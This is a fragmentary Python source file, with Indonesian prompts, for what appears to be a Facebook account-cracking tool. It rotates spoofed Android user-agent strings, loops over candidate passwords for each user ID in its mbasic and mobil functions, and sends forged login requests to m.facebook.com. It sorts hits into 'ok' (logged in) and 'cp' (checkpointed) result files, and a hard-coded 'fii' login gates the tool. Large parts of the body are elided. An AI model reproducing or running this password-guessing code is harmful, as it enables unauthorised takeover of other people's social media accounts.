...
def loginsc():
	os.system('clear')
	print(f"{P}[*] Sebelum Menggunakan Tools saya Login Dulu!!")
	print(f"{B} | ")
	username = input(f"{U}[*] Ussername : ")
	print(f"{B} | ")
	password = input(f"{U}[*] password : ")
	if username =="fii" and password=="fii":
...
## Buat user ##
ua ='Mozilla/5.0 (Linux; Android 11; V2111) AppleWebKit/537.36 (KHTML, p Gecko) Chrome/98.0.4758.128 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 9; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/84.0.4147.105 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 9; Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/85.0.4183.127 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 11; XQ-AT51) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/86.0.4240.75 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 8.1.0; LG-M320) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/87.0.4280.67 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 10; Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/87.0.4280.88 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 10; Mi A2) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/87.0.4280.101 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 11; Pixel 4a (5G)) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/89.0.4389.72 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 11; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/89.0.4389.114 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 10; YAL-L21) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/89.0.4389.114 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/89.0.4389.105 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 10; SNE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/89.0.4389.114 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 10; SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/89.0.4389.86 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 11; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 11; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 11; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36'
ua ='Mozilla/5.0 (Linux; Android 11; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36'

host = ("https://m.facebook.com")
B = random.choice([H,U,I,K])
#### BUAT BANNER
def banner():
    war_dom = random.choice([B,K,H,U,I,M])
    print("""
====================================================
   _____
 / ____|
| (___   __ _ _ __ ___  _   _ _ __ __ _ _   _
 \___ \ / _` | '_ ` _ \| | | | '__/ _` | | | |
 ____) | (_| | | | | | | |_| | | | (_| | |_| |
|_____/ \__,_|_| |_| |_|\__,_|_|  \__,_|\__, |
                                         __/ |
                                        |___/
...
def log_token():
    ...
    try:
        ...
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{H}[*] Sedang Di Proses.......🙏");exit(bot.bot())
    except KeyError:
        print(f"{B} | ")
...
def menu():
    ...
    try:
        ...
        print(f"{B} | ")
        print(f"{B} | ")
        jalan(f"{P}[!]{M} Token Invailed....");os.system("rm -rf token.txt");log_token()
    os.system("clear");banner()
    print(f"{B} | ")
...
def userset():
    ...
    if _pil_ in ["1","01"]:
        ...
        try:
            ...
            _tes_ua=("Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/88.0.4324.96 Mobile Safari/537.36")
        print(f"{B} | ")
...
def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/88.0.4324.96 Mobile Safari/537.36"
...
def cek_results():
    ...
    print(f"{U}[0] Back")
    print(f"{B} | ")
    _pil3h=input(f"{U}[*] Pilih Yang Mana : {B}")
    if _pil3h in ["1","01"]:
        if len(hsl_cp) != 0:
            print(f"{B} | ")
...
def kone():
    print(f"{B} | ")
    print(f"{B} | ")
    print(f"{M}[1] B-api <===> {B}Fast")
    print(f"{M}[2] Mbasic <===> {B}Low")
    print(f"{M}[3] Mobile <===> {B}Very low")

def started():
    print(f"{B} | ")
    print(f"{B} | ")
    print(f"{H}[*]{B} Results {M}ok {I}tersimpan di {M}ok/{tanggal}")
    print(f"{H}[*]{B} Results {K}cp {I}tersimpan di {K}cp/{tanggal}")
    print(f"{B} | ")
...
def mbasic(uid, fii):
	...
	for pw in fii:
		...
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "m.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
...
def mobil(uid, fii):
	...
	for pw in fii:
		...
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://m.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "m.facebook.com", "referer": "https://www.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
